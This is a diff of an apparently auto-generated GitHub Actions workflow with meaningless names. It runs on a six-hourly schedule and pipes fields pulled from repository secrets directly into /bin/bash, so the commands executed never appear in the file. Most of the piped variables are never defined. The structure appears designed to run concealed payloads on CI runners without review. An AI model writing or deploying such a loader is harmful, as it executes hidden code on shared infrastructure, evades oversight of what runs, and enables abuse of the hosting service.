@@ -1,10 +1,11 @@
 name: tangtiandi7816
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
+    - cron: '18 1/6 * * *'
 
-jobs:  # 345
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,27 +13,12 @@ jobs:  # 345
       - uses: actions/checkout@v4
       - name: tangtiandi7816
         env:
-          ouwr43500: ${{ secrets.ouwr43500 }}
+          x59: ${{ secrets.x59 }}
         run: |
-          echo $ouwr43500 | jq -r .kgx227 | /bin/bash
-          echo $jxdy62 | jq -r .bkxbf52659 | /bin/bash
-          echo $xl900 | jq -r .n76 | /bin/bash
-          echo $cztk10 | jq -r .fpily213 | /bin/bash
-          echo $alpx1 | jq -r .gqxg19685 | /bin/bash
-          echo $gqu184 | jq -r .uafs2102 | /bin/bash
-          echo $z8 | jq -r .wuidj9 | /bin/bash
-          echo $j8618 | jq -r .ee10093 | /bin/bash
-          echo $ccldi0 | jq -r .f501 | /bin/bash
-          echo $g2091 | jq -r .pld0 | /bin/bash
-          echo $jxa1359 | jq -r .bcg52 | /bin/bash
-          echo $akun6 | jq -r .zggg0 | /bin/bash
-          echo $vetug76137 | jq -r .o92520 | /bin/bash
-          echo $jtm4 | jq -r .p63219 | /bin/bash
-          echo $kgvz20 | jq -r .m3799 | /bin/bash
-          echo $h5980 | jq -r .d22 | /bin/bash
-          echo $fjd741 | jq -r .ris39888 | /bin/bash
-          echo $lbo3446 | jq -r .y04847 | /bin/bash
-          echo $kmp98 | jq -r .bjw17 | /bin/bash
-          echo $rjewu1 | jq -r .i66154 | /bin/bash
-          echo $cmn26156 | jq -r .k7 | /bin/bash
+          echo $x59 | jq -r .klgel31 | /bin/bash
+          echo $vizo2639 | jq -r .oae6704 | /bin/bash
+          echo $ty83474 | jq -r .dypit667 | /bin/bash
+          echo $dmtlk2434 | jq -r .eyvfy946 | /bin/bash
+          echo $lvnh30647 | jq -r .llmez75 | /bin/bash
+          echo $n39807 | jq -r .srm9579 | /bin/bash
 
